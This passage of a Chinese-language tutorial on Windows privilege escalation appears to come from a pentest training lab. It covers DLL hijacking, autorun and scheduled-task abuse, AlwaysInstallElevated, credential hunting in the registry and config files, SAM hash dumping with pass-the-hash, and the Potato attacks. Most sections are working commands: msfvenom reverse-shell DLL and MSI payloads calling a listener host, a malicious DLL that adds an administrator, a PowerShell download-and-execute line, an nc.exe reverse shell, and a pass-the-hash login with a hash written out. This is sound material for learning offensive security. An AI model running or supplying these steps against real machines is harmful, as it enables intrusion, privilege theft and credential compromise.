<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create dllsvc binPath&#x3D; &quot;C:\Users\Administrator\Desktop\dll hijack test\dllhijackservice.exe&quot; type&#x3D; own</span><br></pre></td></tr></table></figure>

<p>正确的写法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create dllsvc binPath&#x3D; &quot;\&quot;C:\Users\Administrator\Desktop\dll hijack test\dllhijackservice.exe&quot;&quot; type&#x3D; own</span><br></pre></td></tr></table></figure>

<p>测试完要删除的命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc delete dllsvc</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>检查我们是否能够启动/停止服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/25.png" alt="25"></p>
<ol start="3">
<li>查看服务配置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/26.png" alt="26"></p>
<p>找到了文件的执行路径，并且该服务以SYSTEM权限运行</p>
<ol start="4">
<li>分析该文件</li>
</ol>
<p>正常情况下，拷贝这个可执行文件到另一台我们拥有Admin权限的机器上进行分析。<br>这里为了演示，我们直接在这台机器上以Admin身份进行分析</p>
<p>直接以Administrator身份运行Procmon<br>关闭抓取，并清空记录</p>
<p><img src="/images/windows-privilege-escalation/27.png" alt="27"></p>
<p>Ctrl+L进入过滤规则设置，添加规则，输入我们刚刚找到程序的名字</p>
<p><img src="/images/windows-privilege-escalation/28.png" alt="28"></p>
<p>关闭注册表检测和网络检测，并开启抓取</p>
<p><img src="/images/windows-privilege-escalation/29.png" alt="29"></p>
<p>之后开启服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/30.png" alt="30"></p>
<p>关注到<code>NAME NOT FOUND</code>列，这是Windows尝试在目录中寻找的DLL库文件<br>其中<code>C:\Temp\</code>目录是我们之前找到我们可以写入的目录，并且程序在寻找<code>hijackme.dll</code></p>
<p>5.在kali中生成reverse_shell的dll文件，并传输到目标机器上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f dll -o hijackme.dll</span><br></pre></td></tr></table></figure>

<p>除了反弹shell，也可以编译自己任意命令的dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</span></span><br><span class="line"><span class="comment">// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;cmd.exe /k net localgroup administrator user /add&quot;</span>);</span><br><span class="line">        <span class="comment">//system(&quot;cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt&quot;);</span></span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>开启端口监听，启动服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net stop dllsvc</span><br><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/31.png" alt="31"></p>
<h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p>windows可以通过开机时候启动的应用进行提权。这些自启动的程序可以在注册表进行设置，如果你能够修改这些AutoRun的可执行程序并且能够重启机器，可能会得到提权</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas quiet applicationsinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/32.png" alt="32"></p>
<p>发现了可以修改的Autorun程序，并给出了RegPath</p>
<p>另外，可以使用图形化工具<code>Autoruns</code>，在logon选项卡中找到自启动的程序</p>
<ol start="2">
<li>手动枚举该注册表</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/33.png" alt="33"></p>
<ol start="3">
<li>accesschk逐一检查每个执行文件的权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe&#x2F;accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/34.png" alt="34"></p>
<p>检查发现了一个可以修改的可执行程序</p>
<ol start="4">
<li>在真实的渗透中，我们应该备份该文件，接着用我们的reverse_shell的exe文件进行替换</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &quot;C:\Program Files\Autorun Program\program.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>开启监听，注意这里程序自启动的权限是最后一次的登陆者的权限，这意味着如果上一次登录者为Administrator，我们就可以提权，反之则不能<br>(在实验环境中，退出User的登录，以Administrator登录，并重启)<br>开机后，就可以获得上一次登录的权限，这里为Administrator</li>
</ol>
<p><img src="/images/windows-privilege-escalation/35.png" alt="35"></p>
<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>.msi格式的安装包被用来安装应用，这些文件会在尝试安装它们的用户权限下运行。<br>windows允许正常用户提升权限(即admin)来安装应用，这种情况我们可以生成制作好的恶意msi文件，该特性类似于linux的SUID</p>
<p><img src="/images/windows-privilege-escalation/59.png" alt="59"></p>
<p>这种提权需要满足两个注册表值的设定<br>在本地计算机和本地用户的注册表中，AlwaysInstallElevated必须设置为1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<p>如果其中一项没设置，利用就无法完成</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas quiet windowscreds</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/36.png" alt="36"></p>
<p>发现两处值都已设为1</p>
<ol start="2">
<li>手动检查注册表</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/37.png" alt="37"></p>
<ol start="3">
<li>生成一个恶意msi文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f msi -o reverse.msi</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>传输恶意文件，开启端口监听，运行安装程序触发漏洞利用</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/38.png" alt="38"></p>
<h2 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h2><h3 id="Registry-1"><a href="#Registry-1" class="headerlink" title="Registry"></a>Registry</h3><p>管理员可能会重用某些密码，或者将密码存放在系统的可读位置上，windows容易收到此类攻击，因为windows有多个功能会不安全的存储密码</p>
<p>许多程序会在注册表中存放设置选项，windows本身有时也会在注册表中以明文形式存放密码，所以我们应该尝试在注册表中搜索密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>

<p>第一个搜索本地机器，第二搜索本地用户。这两个命令会有大量输出，因此需要查看更加常用的位置</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas.exe quiet filesinfouserinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/39.png" alt="39"></p>
<p><img src="/images/windows-privilege-escalation/40.png" alt="40"></p>
<p>我们发现了Admin用户的AutoLogon credentials和Putty session</p>
<ol start="2">
<li>对两者进行手动枚举</li>
</ol>
<p>AutoLogon credentials</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/41.png" alt="41"></p>
<p>Putty session</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; &#x2F;s</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/42.png" alt="42"></p>
<ol start="3">
<li>使用这些凭据，我们可以基于对方的SMB服务进行提权</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/43.png" alt="43"></p>
<p>既然这个凭据可以成功提权admin，那么可以使用–system参数，来获取system权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; --system &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="PSCredential"><a href="#PSCredential" class="headerlink" title="PSCredential"></a>PSCredential</h4><p>除了PTH，powershell的PSCredential对象也可以存放凭据，存放$cred有两种方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cred&#x3D;$cred&#x3D;Get-Credential</span><br><span class="line">或者</span><br><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;admin&#39;, $SecPass)</span><br></pre></td></tr></table></figure>

<p>其中Get-Credential渗透很难用，需要图形交互。SecureString类可以用来存放密码，这是.net 2.0后引入的类，与Strings类相比</p>
<ul>
<li><p>不再是不可改变的</p>
</li>
<li><p>可被人工销毁</p>
</li>
<li><p>不再会在内存中已明文保存密码，防止被内存提取</p>
</li>
</ul>
<p>因此我们以明文形式输入默认是被禁止的，系统无法保护纯文本输入，所以必须使用参数-Force来强制</p>
<p>之后就可以使用$cred进行提权了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;IP&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>

<p>另外，Invoke-Command和Enter-PSSession可以在开启winrm下启动(没开启会报错连接不上本地)，还需注意指定本地计算机下的用户，否则会默认为域的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;computername\\admin&#39;, $SecPass)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ScriptBlock &#123;whoami&#125; -ComputerName localhost -Credential $cred</span><br><span class="line">Enter-PSSession -ComputerName localhost -Credential $cred</span><br></pre></td></tr></table></figure>

<p><strong>补充说明</strong>:凭据会保存很多位置，winpeas会自动检索常用的一些位置</p>
<p>我们可以以password为关键词，手动搜索注册表，检索键名或键值中出现这个词的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>

<h3 id="Saved-Creds"><a href="#Saved-Creds" class="headerlink" title="Saved Creds"></a>Saved Creds</h3><p>Windows中有一个Runas命令，它允许用户使用其他用户的权限运行命令。这通常需要知道其他用户的密码。<br>但是，Windows还允许用户将凭据保存到系统中，我们可以发现这些保存的凭据，并使用它们绕过</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas.exe quiet cmd windowscreds</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/44.png" alt="44"></p>
<p>发现了管理用户保存的凭据</p>
<ol start="2">
<li>手动枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/45.png" alt="45"></p>
<ol start="3">
<li>我们可以使用保存的凭据以管理员身份运行任何文件，这里我们在kali开启监听，运行reverse_shell</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/46.png" alt="46"></p>
<h3 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h3><p>一些管理员会将密码保存在某些配置文件上，比如Unattend.xml，它允许windows进行自动化设置，所以上面基本可以确认存有密码</p>
<p>比如一些明显的程序如VNC，putty等</p>
<h4 id="寻找配置文件"><a href="#寻找配置文件" class="headerlink" title="寻找配置文件"></a>寻找配置文件</h4><p>在当前目录递归搜索，以pass或.config为结尾的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s *pass* &#x3D;&#x3D; *.config</span><br></pre></td></tr></table></figure>

<p>在当前目录递归搜索，包含单词password，并且以.xml,.ini或.txt为结尾的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;si password *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>

<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas quiet cmd searchfast filesinfo</span><br></pre></td></tr></table></figure>

<p>关注<code>Searching known files that can contain creds</code> 条目下输出的文件</p>
<ol start="2">
<li>手动进行检查即可，看是否存有凭据</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type FILE_LOCATION</span><br></pre></td></tr></table></figure>

<p>metasploit模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows&#x2F;gather&#x2F;enum_unattend</span><br></pre></td></tr></table></figure>

<p>该模块主要检查以下位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep\Panther\Unattend.xml</span><br></pre></td></tr></table></figure>

<h3 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h3><p>Windows将密码的哈希存放在SAM中。这些哈希使用密钥加密，可以在SYSTEM文件中找到密钥。<br>如果可以读取SAM和SYSTEM文件，则可以提取哈希</p>
<p>SAM和SYSTEM文件存放在<code>C:\Windows\System32\config</code>目录下。这两个文件会在windows运行时锁定。<br>存心的管理员会把它备份存储在一些位置如<code>C:\Windows\Repair</code>或<code>C:\Windows\System32\config\RegBack</code></p>
<p>演示(假设发现了备份文件)</p>
<ol>
<li><p>将SAM和SYSTEM文件传输到Kali中</p>
</li>
<li><p>下载pwdump<a href="https://github.com/Neohapsis/creddump7">https://github.com/Neohapsis/creddump7</a><br>获取LM和NTLM哈希</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 creddump7&#x2F;pwdump.pySYSTEM SAM</span><br></pre></td></tr></table></figure>

<p>可以尝试破解，也可以尝试哈希传递攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pth-winexe --system -U &#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/47.png" alt="47"></p>
<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><p>windows可以设置计划任务在一个特定时间执行(比如每5分钟)或者在某些事件触发时执行(比如用户登录)。<br>计划任务的运行权限通常是创建它们的用户权限，但是管理员可以将它们设置为以其他身份运行，包括SYSTEM用户</p>
<p>不幸的是，没有一种简单的方法可以在一个低权限的用户下枚举其他用户计划任务的方法</p>
<p>你可以枚举所有计划任务</p>
<p>CMD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>

<p>Powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</span><br></pre></td></tr></table></figure>

<p>通常，我们需要依赖其他线索， 比如计划任务的执行脚本或日志文件</p>
<p>另外图形化工具Autoruns的ScheduledTasks也可以进行枚举</p>
<p>演示</p>
<ol>
<li>假设发现了一个计划任务脚本，查看它的源码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/48.png" alt="48"></p>
<p>从中发现它运行在SYSTEM权限下</p>
<ol start="2">
<li>检查文件权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw user &quot;C:\DevTools\CleanUp.ps1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/49.png" alt="49"></p>
<p>发现具有文件写入权限</p>
<ol start="3">
<li>真实渗透中，备份该文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\DevTools\CleanUp.ps1 C:\Temp\</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>kali开启监听</p>
</li>
<li><p>使用echo命令，调用reverse.exe的语句追加到该脚本中</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/50.png" alt="50"></p>
<ol start="6">
<li>耐心等待计划任务执行，就可以获得reverse_shell了</li>
</ol>
<p><img src="/images/windows-privilege-escalation/51.png" alt="51"></p>
<h2 id="Insecure-GUI-Apps-Citrix-Method"><a href="#Insecure-GUI-Apps-Citrix-Method" class="headerlink" title="Insecure GUI Apps (Citrix Method)"></a>Insecure GUI Apps (Citrix Method)</h2><p>在某些(旧)版本的windows中，用户可以被授予权限，可以以管理员身份运行某些GUI程序<br>我们有很多种方法可以在GUI中生成命令提示符，包括使用windows本身的功能。<br>由于GUI父进程以管理员权限运行，因此生成的命令提示符也会以管理员权限运行。这称为<code>Citrix Method</code>，因为它使用了许多与Citrix环境相同的技术</p>
<p>演示</p>
<ol>
<li>以user权限GUI登录到windows中</li>
<li>在桌面发现了名为AdminPaint的快捷方式，运行它</li>
</ol>
<p><img src="/images/windows-privilege-escalation/52.png" alt="52"></p>
<ol start="3">
<li>枚举该进程的运行权限</li>
</ol>
<p><img src="/images/windows-privilege-escalation/53.png" alt="53"></p>
<p>发现其运行在admin权限下</p>
<ol start="4">
<li>点击左上角FIle→Open→打开文件输入file://c:/windows/system32/cmd.exe，接着不要点击Open，直接敲击回车</li>
</ol>
<p><img src="/images/windows-privilege-escalation/54.png" alt="54"></p>
<ol start="5">
<li>生成高权限shell</li>
</ol>
<p><img src="/images/windows-privilege-escalation/55.png" alt="55"></p>
<h2 id="Startup-Apps"><a href="#Startup-Apps" class="headerlink" title="Startup Apps"></a>Startup Apps</h2><p>每个用户都可以通过将快捷方式放置在特定目录中定义在登录时启动的应用程序<br>Windows提供了启动目录来存放启动程序，并会在任何用户登录时启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>

<p>当然，肯定和单用户的启动目录无关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<p>如果我们可以在此目录中创建文件，则可以在管理员登录时加载reverse_shell可执行文件，来进行提权</p>
<p>注意，必须使用快捷方式文件(.lnk)。我们将使用一个VBScript来创建快捷方式文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set oWS &#x3D; WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">sLinkFile &#x3D; &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;</span><br><span class="line">Set oLink &#x3D; oWS.CreateShortcut(sLinkFile)</span><br><span class="line">oLink.TargetPath &#x3D; &quot;C:\PrivEsc\reverse.exe&quot;</span><br><span class="line">oLink.Save</span><br></pre></td></tr></table></figure>

<p>演示</p>
<p>accesschk检查StartUp目录当前用户权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/56.png" alt="56"></p>
<p>我们发现它允许BUILTIN\Users进行RW权限，即我们用户所在组</p>
<p>创建刚刚VBScript脚本文件，并执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript CreateShortcut.vbs</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/57.png" alt="57"></p>
<p>kali开启监听，当admin账户登录到该机器时，我们可以获得提权</p>
<p><img src="/images/windows-privilege-escalation/58.png" alt="58"></p>
<h2 id="Installed-Applications"><a href="#Installed-Applications" class="headerlink" title="Installed Applications"></a>Installed Applications</h2><p>第三方安装应用的提权方式，大多数会基于前面已经介绍过的漏洞进行提权。不过仍然会有如缓冲区溢出等原因导致的某些权限提升，因此我们需要准确枚举出已安装的第三方应用以及寻找公开漏洞</p>
<p>枚举当前运行的应用程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br><span class="line">Get-WmiObject Win32_Process | Select-Object ProcessId, ProcessName, CommandLine, pid</span><br></pre></td></tr></table></figure>

<p>使用seabelt来枚举非标准程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\seatbelt.exe NonstandardProcesses</span><br></pre></td></tr></table></figure>

<p>winpeas枚举(注意它这里prcesinfo就用拼错的)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet procesinfo</span><br></pre></td></tr></table></figure>

<p>检查上面工具的所有输出，一旦找到有趣的进程后，尝试确认它的版本。你可以尝试执行它的可执行文件，并使用<code>/?</code>或<code>-h</code>，同时检查该程序所在目录的一些配置文件。接着寻找公开漏洞利用，编译并运行利用程序</p>
<h2 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h2><p>土豆家族的攻击原理非常有趣，以后再写更详细的攻击原理</p>
<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>Hot Patato是一个攻击工具，简单来说它通过进行NTLM重放攻击完成欺骗攻击，可以获得SYSTEM权限。该攻击诱使Windows使用NTLM用户身份验证到伪造的HTTP服务器，接着将NTLM凭据重放到SMB，从而达到命令执行。这种攻击适用于windows7、8和部分早期版本的windows10</p>
<p>针对不同版本的windows会有不同的参数，这里演示的是win7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\potato.exe -ip 192.168.1.33 -cmd &quot;C:\Users\test7sp1\Desktop\reverse.exe&quot; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true</span><br><span class="line">ip     本机的ip</span><br><span class="line">cmd    想执行的命令</span><br></pre></td></tr></table></figure>

<p>另外有一个明文Tater.ps1是HotPotato通过powershell的实现，也具有同样效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-Tater -Trigger 1 -Command &quot;C:\Users\user\Desktop\nc.exe 192.168.110.2 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Service-Accounts-Rotten-Juicy-Potato"><a href="#Service-Accounts-Rotten-Juicy-Potato" class="headerlink" title="Service Accounts (Rotten / Juicy Potato)"></a>Service Accounts (Rotten / Juicy Potato)</h3><p>回顾一下服务账号的特性，对于其账号关联的服务有特殊的权限，不可以直接登录。服务账号可以用来进行提权</p>
<p>2016年发现了Rotten Potato进行提权，服务账户可以盗取SYSTEM的票据并假冒SYSTEM用户，这个利用需要开启SeImpersonatePrivilege</p>
<p>之后的Juicy Potato是Rotten Potato的升级版，运作原理相同，但提供了更多的利用方式</p>
<p><strong>记住</strong>，这种攻击的对象是服务账户</p>
<p>演示，这里还是windows7环境</p>
<p>我们先要获取一个服务账户的shell，在kali中开启监听，以admin身份登录windows7，使用psexec切换账户，并运行反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\PrivEsc\PSExec64.exe -i -u &quot;ntauthority\local service&quot; C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>

<p>现在我们就获得了服务账户的shell</p>
<ol>
<li>手动枚举权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;whoami &#x2F;priv</span><br><span class="line">SeImpersonatePrivilege		Enabled</span><br></pre></td></tr></table></figure>

<p>确认SeImpersonatePrivilege为开启</p>
<ol start="2">
<li>kali开启监听，使用juicy potato</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line">-l		指定端口，必须不能被使用</span><br><span class="line">-p		指定命令</span><br><span class="line">-c		指定一个该windows中存在的clsid</span><br></pre></td></tr></table></figure>

<p>这样就能获取SYSTEM权限的shell</p>
<h3 id="Juicypotato和roguepotato的区别"><a href="#Juicypotato和roguepotato的区别" class="headerlink" title="Juicypotato和roguepotato的区别"></a>Juicypotato和roguepotato的区别</h3><p>有一些不错的文章已经很好的讲述两个提权的工作原理:，<a href="https://iv4n.cc/potato-family-local-priv-elevate/">roguepotato链接</a></p>
<p>需要记住juicypotato在低版本windows上有用，roguepotato在高版本上有用，除此以外需要记住网络连接上的差异</p>
<p>juicypotato<br>运行程序→RPC到指定端口(如9999)这里会窃取token</p>
<p>微软如何修复<br>将RPC端口硬编码为135端口</p>
<p>roguepotato<br>运行程序→RPC到攻击者控制的135端口→攻击者转发流量到目标端口(如9999,该端口会运行rogueOxidResolver)<br>正常只需要运行端口转发，将本地135端口转发到对方的Oxid Resolver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:135,reuseaddr,fork tcp:TargetIP:9999</span><br></pre></td></tr></table></figure>

<p>这期间可能会遇到防火墙阻断端口连接的问题，这就需要额外的隧道，例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">受害者和攻击者建立隧道，让攻击者9999端口的流量发送受害者本地的9999端口</span><br></pre></td></tr></table></figure>

<h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>有时候易受攻击的端口只在内部监听，在这种情况下，我们需要使用远程端口转发，可以使用plink</p>
